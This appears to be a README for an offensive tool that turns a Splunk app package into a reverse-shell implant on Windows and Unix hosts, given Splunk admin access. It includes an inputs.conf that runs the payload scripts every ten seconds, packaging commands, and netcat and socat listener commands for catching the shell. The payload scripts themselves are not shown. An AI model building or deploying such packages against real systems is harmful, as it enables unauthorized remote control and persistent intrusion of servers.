# reverse_shell_splunk
A simple splunk package for obtaining reverse shells on both Windows and most *nix systems. 

# requirements 
* splunk administrative access
* a netcat / socat listener on the attacking machine 


# how to use


* Depending on the target machine, you will either need to edit the rev.py for unix type machines or run.ps1 for Windows machines. Enter your attacking machine IP and ports. 
* Your files and directory structure should look like this.


```
reverse_shell_splunk
├── bin
│   ├── rev.py
│   ├── run.bat
│   └── run.ps1
└── default
    └── inputs.conf

```

* inputs.conf in this instance is the configuration file that tells splunk to launch the run.bat file and at what interval. In the example below "run.bat" will be run every 10 seconds. Because splunk only runs .bat files, the call inside "run.bat" is to a file with its same name. When run.bat is called, run.ps1 being in the same directory and having the same name will be run. 


```
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = pentest

[script://.\bin\run.bat]
disabled = 0
sourcetype = pentest
interval = 10

```
* Once you have finished editing the files you will need to tar up the directory and its contents. Make sure to keep the directory and file structure in the example above. Lastly rename the .tgz file to .spl

```

tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk
mv reverse_shell_splunk.tgz reverse_shell_splunk.spl

```

* Launch your listener and upload this package via the app installation page. 

```
Listener options
nc -nlvp "port"
or 
socat `tty`,raw,echo=0 tcp-listen:"port"
```

Note: I have had to restart the splunk service on unix type machines in my testing for this to work. No restarts are needed on windows machine. 
